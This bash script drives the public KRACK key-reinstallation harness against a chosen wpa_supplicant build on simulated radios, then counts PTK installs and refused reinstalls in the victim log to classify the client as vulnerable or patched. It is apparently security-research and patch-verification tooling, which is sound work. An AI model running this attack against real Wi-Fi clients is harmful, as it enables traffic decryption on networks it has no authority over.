#!/bin/bash
# run-attack.sh - drive the KRACK four-way-handshake key-reinstallation test
#                 against one wpa_supplicant client and report the result.
#
# Usage:
#   run-attack.sh <client-wpa_supplicant-binary> <out-prefix>
#
#   <client-wpa_supplicant-binary>  path to the victim wpa_supplicant to test
#                                   (e.g. ~/wpa_supplicant-2.3/wpa_supplicant/wpa_supplicant
#                                    for the unpatched case, or /usr/sbin/wpa_supplicant
#                                    for the patched 2.10 case).
#   <out-prefix>                    writes <out-prefix>.ap.log (access point /
#                                   attack driver) and <out-prefix>.cl.log
#                                   (victim, captured with -dd -K).
#
# What it does:
#   Brings up Mathy Vanhoef's modified-hostapd KRACK harness
#   (krack-test-client.py), waits for the access point to come up, starts the
#   victim with full debug + key logging, gives it an address and generates
#   traffic so it uses the installed key, lets the access point retransmit
#   four-way Message 3, then counts - from the victim's own debug log - how
#   many times it installed the pairwise key versus refused to reinstall it.
#
#   On an unpatched client (no reinstall guard) the key is installed on every
#   retransmitted Message 3; on a patched client it is installed once and every
#   reinstall is refused. That count, read from the victim log, is the evidence.
#
# Environment (override by exporting before the call):
#   KDIR      krackattack dir with krack-test-client.py + venv
#             (default: <this script>/../krackattacks-scripts/krackattack,
#              i.e. the pinned submodule at attack/krackattacks-scripts)
#   CONF      victim wpa_supplicant config
#             (default: <this script>/../config/client.conf, i.e. attack/config/client.conf)
#   IFACE_AP  access-point radio   (default: wlan0)
#   IFACE_CL  victim client radio  (default: wlan1)
#   DUR       seconds to let the attack retransmit after connect (default: 45)
#   MODE      extra krack-test-client.py args for the supplementary variants
#             (e.g. --group, --gtkinit, --replay-broadcast, --tptk). Empty by
#             default: the featured demonstration is the pairwise four-way case.
#
# Note: under mac80211_hwsim the tool's own on-air "...reinstalls the key"
# verdict does not fire (the shared datapath never resets the on-air packet
# number). The victim -dd -K log counted here is the authoritative evidence.
# See ../README.md "Limitation of the simulated route".

set -u

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

CLIENT_BIN="${1:?usage: run-attack.sh <client-wpa_supplicant-binary> <out-prefix>}"
OUT="${2:?usage: run-attack.sh <client-wpa_supplicant-binary> <out-prefix>}"

KDIR="${KDIR:-$SCRIPT_DIR/../krackattacks-scripts/krackattack}"
CONF="${CONF:-$SCRIPT_DIR/../config/client.conf}"
IFACE_AP="${IFACE_AP:-wlan0}"
IFACE_CL="${IFACE_CL:-wlan1}"
DUR="${DUR:-45}"
MODE="${MODE:-}"

case "$OUT" in /*) : ;; *) OUT="$(pwd)/$OUT" ;; esac
APLOG="${OUT}.ap.log"
CLLOG="${OUT}.cl.log"

cleanup() {
  sudo pkill -f krack-test-client 2>/dev/null
  sudo pkill -x hostapd 2>/dev/null
  sudo pkill -f "wpa_supplicant .*$IFACE_CL" 2>/dev/null
  sudo pkill -f "dhclient" 2>/dev/null
  sudo pkill -f "ping -I $IFACE_CL" 2>/dev/null
  sudo rm -f "/run/wpa_supplicant/$IFACE_CL" 2>/dev/null
  sleep 1
}

echo "### CLIENT=$CLIENT_BIN OUT=$OUT MODE='${MODE:-pairwise(default)}' DUR=${DUR}s"
[ -x "$CLIENT_BIN" ] || { echo "!! client binary not executable: $CLIENT_BIN"; exit 2; }
[ -f "$CONF" ]       || { echo "!! client config not found: $CONF"; exit 2; }
[ -d "$KDIR" ]       || { echo "!! krackattack dir not found: $KDIR"; exit 2; }

cleanup

# Fresh virtual radios every run so each run begins identically.
sudo modprobe -r mac80211_hwsim 2>/dev/null; sleep 1
sudo modprobe mac80211_hwsim radios=2;        sleep 2
sudo rfkill unblock all 2>/dev/null

# Start the modified-hostapd KRACK test harness (access point + attack driver).
cd "$KDIR" || exit 2
sudo ./venv/bin/python ./krack-test-client.py $MODE > "$APLOG" 2>&1 &

# Wait for the access point to come up (the python "Ready" line goes to a TTY,
# not this log; AP-ENABLED is the reliable marker in the log).
for _ in $(seq 1 40); do
  grep -q "AP-ENABLED" "$APLOG" && break
  sleep 0.5
done
if ! grep -q "AP-ENABLED" "$APLOG"; then
  echo "!! access point never enabled"; tail -5 "$APLOG"; cleanup; exit 1
fi
sleep 2
echo "-- access point up, starting victim client"

# Start the victim with full debug (-dd) and key logging (-K): this log is the evidence.
sudo "$CLIENT_BIN" -dd -K -D nl80211 -i "$IFACE_CL" -c "$CONF" > "$CLLOG" 2>&1 &
sleep 6

# Give the client an address and make it transmit so it uses the installed key.
sudo timeout 10 dhclient -v "$IFACE_CL" >/dev/null 2>&1 &
sleep 3
sudo ip addr add 192.168.100.2/24 dev "$IFACE_CL" 2>/dev/null
sudo ping -I "$IFACE_CL" -c "$DUR" -i 1 192.168.100.254 >/dev/null 2>&1 &

echo "-- attack running for ${DUR}s (access point retransmits Message 3)"
sleep "$DUR"

cleanup

# Read the reinstall behaviour straight from the victim's -dd -K log.
inst=$(grep -c 'Installing PTK to the driver' "$CLLOG")
guard=$(grep -c 'Do not re-install same PTK'  "$CLLOG")
done4=$(grep -c 'Key negotiation completed'    "$CLLOG")

echo "== RESULTS for $OUT =="
printf '  Installing PTK to the driver : %s   (1 initial + reinstalls)\n' "$inst"
printf '  Do not re-install same PTK   : %s   (guard refusals)\n'          "$guard"
printf '  Key negotiation completed    : %s\n'                             "$done4"
echo   "  Verdict: install>1 with guard=0 => VULNERABLE (reinstalls);"
echo   "           install=1 with guard>0 => PATCHED (refuses reinstall)."
echo   "  Logs: $CLLOG (victim, authoritative), $APLOG (access point)."
